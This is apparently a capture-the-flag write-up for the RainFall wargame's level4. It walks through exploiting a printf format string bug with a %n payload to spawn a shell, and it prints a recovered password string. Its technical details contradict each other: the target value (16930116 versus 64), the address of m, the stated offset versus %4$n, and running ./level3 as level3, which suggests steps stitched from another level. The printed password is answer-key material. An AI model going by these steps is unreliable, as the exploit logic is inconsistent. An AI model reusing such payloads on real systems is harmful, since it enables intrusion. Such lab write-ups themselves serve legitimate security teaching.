# Level4

## Objective

The goal of Level 4 is to escalate from `level4` to `level5` by exploiting a format string vulnerability in the `level4` binary. By the end, you should be able to read the password for `level4`.

---

## Step 1: Examine the Binary

After switching to `level4`:

```bash
level4@RainFall:~$ ls
level4
```

Running the binary:

```bash
level4@RainFall:~$ ./level4
Hello
Hello
```

The program simply echoes back what we type, but suspiciously uses `printf()` directly with user input.

---

## Step 2: Investigate with `ltrace`

```bash
level4@RainFall:~$ ltrace ./level4
printf("test") = 4
```

We see that `printf()` is called **without a format string**, which means our input is treated as the format string itself.

---

## Step 3: Test with Format Specifiers

```bash
level4@RainFall:~$ ./level4
%p %p %p %p
0xbffff744 0xb7fd0ff4 0x80484b7 0x25207025
```

We can dump stack values using `%p`. This confirms a **format string vulnerability**.

I'm sure you want to understand whats the point here. The `%n` reads the input and write the number of bytes he read right after.
Yes, if we make him read a sequence of chosen numbers he will possibly over-write the number corresponding. (to an adress maybe ?)

---

## Step 4: Lets try to disass functions.

We found two functions, `p()` and `n()`.
`p()` uses printf,
`n()` - reads our input,
      - calls `p()`,
      - gives a value to m (a global variable empty so far) [0x8049810]
      - compare m with 0x1025544
      - if m != jump to an exit
      - else run `/bin/sh`

The goal here is clear give m the right value to pass the cmp and execute the syscall.

---

## Step 5: So what's the expected input?

We want to overwrite a global variable called `m` that controls access to the target function. The program wants m to be equal to `16930116` in decimal.

Therefore, our goal is to use `%n` to write the value `16930116` into the memory address of `m`.

---

## Step 6: Find the ofset

```bash
python -c 'print "aaaa" + "%x" + 15' > /tmp/exploit
cat /tmp/exploit | ./level4
```
The ofset is at the 12th position.

We inject the address of `m` into the input, followed by a format string to write `64` bytes before using `%n`:

```bash
python -c 'print "\x8c\x98\x04\x08" + "%60u" + "%4$n"' > /tmp/exploit
```

Explanation:

* `\x8c\x98\x04\x08` → address of `m` in little-endian.
* `%60u` → prints 60 characters.
* `%4$n` → writes the number of printed characters (60 + 4 = 64) into the 4th argument on the stack (our `m` address).

---

## Step 7: Run Exploit

```bash
level3@RainFall:~$ ./level3 < /tmp/exploit
whoami
level4
cat /home/user/level4/.pass
4c7e7b3068693b3c1a4d3ff39f0c9ca78eb2d2f63bdba4a1d2a8e1da7544f44e
```

We successfully overwrite `m` and trigger the hidden shell.

---

## Step 8: Summary

* **Vulnerability:** format string bug (`printf(user_input)`).
* **Offset:** writing with `%n` directly to the global variable `m`.
* **Target:** set `m = 64` to unlock `system("/bin/sh")`.
* **Outcome:** gained a shell as `level4` and retrieved the password.

> With this, you can `su level4` using the password.


